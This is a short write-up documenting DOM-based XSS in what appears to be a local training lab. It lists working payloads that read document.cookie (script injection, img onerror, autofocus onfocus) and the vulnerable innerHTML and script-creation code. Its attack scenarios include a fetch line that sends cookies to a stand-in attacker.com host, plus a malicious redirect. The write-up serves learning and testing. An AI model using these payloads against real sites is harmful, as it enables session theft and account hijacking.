# xss payloads documentation

## vulnerability analysis

**target application**: `http://localhost:8000/`

**vulnerability type**: dom-based xss

**attack vector**: form input field with insufficient sanitization

## successful payloads

### 1. direct DOM Manipulation

**payload**: `document.getElementById('cookieOutput').innerHTML = 'Cookie value: '+document.cookie`

**injection point**: text input field

**execution context**: script element creation

**result**: successfully displays cookie content "Cookie value: ftcookies=if_you_see_me_its_win"

### 2. direct javascript execution

**payload**: `alert(document.cookie)`

**injection point**: text input field

**execution context**: script element creation

**result**: open a popup and successfully displays cookie content "ftcookies=if_you_see_me_its_win"

### 3. event handler exploitation

**payload**: `<img src=x onerror=alert(document.cookie)>`

**injection point**: text input field via innerhtml

**execution context**: image load error event

**result**: open a popup and successfully displays cookie content "ftcookies=if_you_see_me_its_win"

### 5. input focus-based payload

**payload**: `<input onfocus=alert(document.cookie) autofocus>`

**injection point**: text input field via innerhtml

**execution context**: automatic focus event

**result**: create a input text that display a popup and successfully display cookie content "ftcookies=if_you_see_me_its_win"

## technical analysis

### root cause

the application contains two critical vulnerabilities:

1 - **unsafe innerhtml usage**:

```javascript
document.getelementbyid("output").innerhtml = "<b>" + userinput + "</b>";
```

allows html/javascript injection through dom manipulation.

2 - **direct script element creation**:

```javascript
var script = document.createelement("script");
script.textcontent = userinput;
document.body.appendchild(script);
```

directly executes user input as javascript code.

### attack scenarios

#### scenario 1: cookie theft

- **payload**: `fetch('http://attacker.com/steal?cookie=' + document.cookie)`
- **impact**: exfiltrates session cookies to external server
- **risk level**: critical

#### scenario 2: session hijacking

- **payload**: `window.location='http://attacker.com/login?redirect=' + document.url`
- **impact**: redirects user to malicious login page
- **risk level**: high

## testing environment

- **browser**: firefox v140.0.2
- **date**: 06/08/2025
- **tester**: Daniel Trigo - dande-je
